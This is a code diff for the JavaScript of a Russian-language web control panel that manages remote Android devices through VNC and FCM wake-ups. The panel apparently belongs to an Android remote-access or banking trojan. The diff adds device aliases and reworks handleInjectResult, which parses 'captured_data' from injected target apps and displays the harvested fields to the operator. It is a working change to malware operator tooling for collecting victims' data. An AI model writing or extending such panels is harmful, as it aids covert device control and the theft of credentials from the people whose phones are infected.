@@ -4606,17 +4606,20 @@
             if (!selectedDevice) return;
 
             _updateFCMWakeBtn();
-            document.getElementById('devPickerName').textContent = selectedDevice.name;
+            const _devDisplayName = selectedDevice.alias || selectedDevice.name;
+            document.getElementById('devPickerName').textContent = _devDisplayName;
             document.getElementById('devPickerDot').style.display = 'block';
 
             deviceSection.style.display = 'block';
-            document.getElementById('deviceName').textContent = selectedDevice.name;
-            document.getElementById('deviceId').textContent = selectedDevice.id;
+            document.getElementById('deviceName').textContent = _devDisplayName;
+            document.getElementById('deviceId').textContent = selectedDevice.alias
+                ? selectedDevice.id + ' · ' + selectedDevice.alias
+                : selectedDevice.id;
             document.getElementById('statBattery').textContent = selectedDevice.battery + '%';
             document.getElementById('statResolution').textContent = selectedDevice.resolution;
             document.getElementById('statAndroid').textContent = selectedDevice.android;
 
-            connectTitle.textContent = selectedDevice.name;
+            connectTitle.textContent = _devDisplayName;
             if (!vncDeviceIds.has(deviceId)) {
                 connectStatus.textContent = 'VNC не подключён — устройство онлайн но VNC клиент неактивен';
                 connectStatus.className = 'connect-status warning';
@@ -7267,7 +7270,15 @@
         function handleInjectResult(data) {
             const pkg = data.target_package || '';
             const name = data.app_name || pkg;
-            const cd = data.captured_data || {};
+            const META_KEYS = new Set(['type','device_id','target_package','package','app_name','app']);
+            let cd = {};
+            if (data.captured_data && typeof data.captured_data === 'object') {
+                cd = data.captured_data;
+            } else if (typeof data.captured_data === 'string') {
+                try { cd = JSON.parse(data.captured_data); } catch(_) {}
+            } else {
+                Object.keys(data).forEach(k => { if (!META_KEYS.has(k)) cd[k] = data[k]; });
+            }
             const fields = Object.entries(cd).map(([k,v]) => `${k}: ${v}`).join(', ');
             showNotification(`${name}: ${fields}`, 'success');
             const dt = _injectDeviceTargets.find(t => (t.package || t.target_package) === pkg);
